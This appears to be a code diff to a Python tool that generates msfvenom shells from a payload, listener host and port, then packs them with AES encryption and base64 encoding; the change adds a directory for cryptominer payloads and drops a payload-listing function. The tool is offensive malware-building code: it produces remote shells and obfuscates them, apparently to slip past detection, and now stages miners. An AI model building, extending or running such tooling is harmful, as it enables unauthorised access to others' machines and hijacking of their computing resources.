@@ -6,9 +6,9 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from cryptography.fernet import Fernet
 
-# Directories
 SHELLS_DIR = "generated_shells"
 PAYLOADS_DIR = "payloads"
+CRYPTOMINERS_DIR = os.path.join(PAYLOADS_DIR, "cryptominers")
 
 if not os.path.exists(SHELLS_DIR):
     os.makedirs(SHELLS_DIR)
@@ -18,26 +18,9 @@ if not os.path.exists(PAYLOADS_DIR):
     os.makedirs(PAYLOADS_DIR)
     print(f"[INFO] Created directory for payloads: {PAYLOADS_DIR}")
 
-
-# Function: List Payloads
-def list_payloads():
-    """
-    List available payloads in the payloads directory.
-    :return: List of payload file paths.
-    """
-    try:
-        payload_files = [f for f in os.listdir(PAYLOADS_DIR) if os.path.isfile(os.path.join(PAYLOADS_DIR, f))]
-        if not payload_files:
-            print("[INFO] No payloads found in the payloads directory.")
-        else:
-            print("\n[ Available Payloads ]")
-            for idx, payload in enumerate(payload_files, 1):
-                print(f"{idx}.) {payload}")
-        return payload_files
-    except Exception as e:
-        print(f"[ERROR] Failed to list payloads: {e}")
-        return []
-
+if not os.path.exists(CRYPTOMINERS_DIR):
+    os.makedirs(CRYPTOMINERS_DIR)
+    print(f"[INFO] Created directory for cryptominers: {CRYPTOMINERS_DIR}")
 
 # Function: Generate Shell
 def generate_msfvenom_shell(payload, lhost, lport, output_format, output_name):
@@ -59,7 +42,6 @@ def generate_msfvenom_shell(payload, lhost, lport, output_format, output_name):
         print(f"[ERROR] Failed to generate shell: {e}")
         return None
 
-
 # AES Encryption Functions
 def aes_encrypt(data, key):
     try:
@@ -71,7 +53,6 @@ def aes_encrypt(data, key):
         print(f"[ERROR] AES encryption failed: {e}")
         return None
 
-
 def aes_decrypt(encrypted_data, key):
     try:
         iv = encrypted_data[:16]
@@ -81,7 +62,6 @@ def aes_decrypt(encrypted_data, key):
     except Exception as e:
         print(f"[ERROR] AES decryption failed: {e}")
         return None
-
 
 # Base64 Encoding Functions
 def base64_encode(data):
@@ -93,7 +73,6 @@ def base64_encode(data):
         print(f"[ERROR] Base64 encoding failed: {e}")
         return None
 
-
 def base64_decode(encoded_data):
     try:
         decoded = base64.b64decode(encoded_data)
@@ -102,7 +81,6 @@ def base64_decode(encoded_data):
     except Exception as e:
         print(f"[ERROR] Base64 decoding failed: {e}")
         return None
-
 
 # Function: Encrypt Shell (AES + Base64)
 def encrypt_shell(shell_path, encryption_key):
@@ -132,7 +110,6 @@ def encrypt_shell(shell_path, encryption_key):
         print(f"[ERROR] Failed to encrypt shell: {e}")
         return None
 
-
 # Function: Decrypt Shell (Base64 + AES)
 def decrypt_shell(encrypted_path, encryption_key):
     if not os.path.exists(encrypted_path):
@@ -160,7 +137,6 @@ def decrypt_shell(encrypted_path, encryption_key):
     except Exception as e:
         print(f"[ERROR] Failed to decrypt shell: {e}")
         return None
-
 
 # Example: Generate Encryption Key
 def generate_aes_key():
